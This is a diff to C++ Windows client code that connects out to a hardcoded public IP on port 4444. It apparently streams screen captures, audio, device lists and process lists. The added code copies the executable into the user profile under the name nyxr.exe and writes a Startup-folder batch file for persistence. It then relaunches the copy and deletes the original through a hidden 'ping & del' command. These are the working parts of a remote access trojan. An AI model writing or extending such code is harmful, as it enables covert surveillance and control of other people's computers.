@@ -13,6 +13,8 @@
 #include <fstream>
 #include <vector>
 #include <cstdio>
+#include <cstdlib>
+#include <cstring>
 #include <atomic>
 
 #pragma comment(lib, "ws2_32.lib")
@@ -24,11 +26,29 @@
 const int PORT=4444;
 enum ChannelType { CH_MAIN=0, CH_AUDIO=1, CH_DEVLIST=2, CH_DIALOG=3, CH_PROCLIST=4 };
 
-// Reads server IP from server_ip.txt next to exe, falls back to hardcoded default
+// Default public IP used only the very first time server_ip.txt is created.
+// Edit %USERPROFILE%\server_ip.txt later if your public IP changes.
+static const char* DEFAULT_SERVER_IP = "94.28.233.146";
+
+// ---------- Path helpers (used for self-relocation + server_ip.txt) ----------
+
+static std::string GetUserProfileDir(){
+    const char* up = getenv("USERPROFILE");
+    return up ? std::string(up) : std::string(".");
+}
+static std::string GetTargetExePath(){
+    return GetUserProfileDir() + "\\nyxr.exe";
+}
+static std::string GetServerIpFilePath(){
+    return GetUserProfileDir() + "\\server_ip.txt";
+}
+
+// Reads server IP from %USERPROFILE%\server_ip.txt, falls back to DEFAULT_SERVER_IP
 const char* GetServerIP(){
     static char ipBuf[64]={0};
     if(ipBuf[0]==0){
-        FILE*f=fopen("server_ip.txt","r");
+        std::string path = GetServerIpFilePath();
+        FILE*f=fopen(path.c_str(),"r");
         if(f){
             if(fgets(ipBuf,sizeof(ipBuf),f)){
                 int len=(int)strlen(ipBuf);
@@ -38,10 +58,79 @@ const char* GetServerIP(){
             fclose(f);
         }
         if(ipBuf[0]==0)
-            strncpy(ipBuf,"192.168.0.104",sizeof(ipBuf)-1);
+            strncpy(ipBuf, DEFAULT_SERVER_IP, sizeof(ipBuf)-1);
     }
     return ipBuf;
 }
+
+// Copies this exe to %USERPROFILE%\nyxr.exe on first run, sets up server_ip.txt
+// and the Startup .bat, relaunches from the new location, and deletes the
+// original file. On subsequent runs (already in %USERPROFILE%) it just
+// makes sure server_ip.txt and the startup entry exist, then returns.
+void RelocateSelfIfNeeded(){
+    char selfPathBuf[MAX_PATH]={0};
+    GetModuleFileNameA(NULL, selfPathBuf, MAX_PATH);
+    std::string targetPath = GetTargetExePath();
+
+    char fullSelf[MAX_PATH]={0}, fullTarget[MAX_PATH]={0};
+    GetFullPathNameA(selfPathBuf, MAX_PATH, fullSelf, NULL);
+    GetFullPathNameA(targetPath.c_str(), MAX_PATH, fullTarget, NULL);
+
+    bool alreadyInPlace = (_stricmp(fullSelf, fullTarget) == 0);
+
+    if(!alreadyInPlace){
+        CopyFileA(fullSelf, fullTarget, FALSE); // FALSE = overwrite if exists
+    }
+
+    // Ensure server_ip.txt exists (don't clobber if the user already edited it)
+    {
+        std::string ipPath = GetServerIpFilePath();
+        std::ifstream check(ipPath);
+        bool ipExists = check.good();
+        check.close();
+        if(!ipExists){
+            std::ofstream out(ipPath);
+            out << DEFAULT_SERVER_IP << "\n";
+        }
+    }
+
+    // Always (re)write the startup entry so it survives reboots/crashes
+    {
+        std::string batPath = GetUserProfileDir() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
+        std::ofstream bat(batPath);
+        bat << "@echo off\nstart \"\" \"" << fullTarget << "\"\n";
+        bat.close();
+    }
+
+    if(!alreadyInPlace){
+        // Launch the relocated copy
+        {
+            std::string launchCmd = "\"" + std::string(fullTarget) + "\"";
+            std::vector<char> cmdBuf(launchCmd.begin(), launchCmd.end());
+            cmdBuf.push_back('\0');
+            STARTUPINFOA si={sizeof(si)}; PROCESS_INFORMATION pi{};
+            CreateProcessA(NULL, cmdBuf.data(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+            if(pi.hProcess) CloseHandle(pi.hProcess);
+            if(pi.hThread) CloseHandle(pi.hThread);
+        }
+
+        // Schedule deletion of the original exe after this process exits
+        {
+            std::string delCmd = "cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q \"" + std::string(fullSelf) + "\"";
+            std::vector<char> delBuf(delCmd.begin(), delCmd.end());
+            delBuf.push_back('\0');
+            STARTUPINFOA si2={sizeof(si2)}; si2.dwFlags=STARTF_USESHOWWINDOW; si2.wShowWindow=SW_HIDE;
+            PROCESS_INFORMATION pi2{};
+            CreateProcessA(NULL, delBuf.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2);
+            if(pi2.hProcess) CloseHandle(pi2.hProcess);
+            if(pi2.hThread) CloseHandle(pi2.hThread);
+        }
+
+        ExitProcess(0);
+    }
+}
+
+// ---------- Everything below is unchanged except channel bytes ----------
 
 static const GUID s_SUBTYPE_FLOAT={0x00000003,0x0000,0x0010,{0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}};
 static const GUID s_SUBTYPE_PCM={0x00000001,0x0000,0x0010,{0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71}};
@@ -138,7 +227,8 @@ void CommandListener(SOCKET s){
 
 int main(){
     SetProcessDPIAware();
-    {char me[MAX_PATH];GetModuleFileNameA(0,me,MAX_PATH);std::string path=std::string(getenv("USERPROFILE"))+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";std::ofstream bat(path);bat<<"@echo off\nstart \"\" \""<<me<<"\"\n";bat.close();}
+    RelocateSelfIfNeeded();
+
     WSADATA wsa;if(WSAStartup(MAKEWORD(2,2),&wsa)!=0)return 1;
     Gdiplus::GdiplusStartupInput gdip;ULONG_PTR gt;Gdiplus::GdiplusStartup(&gt,&gdip,0);
     CLSID jc;GetEncoderClsid(L"image/jpeg",&jc);
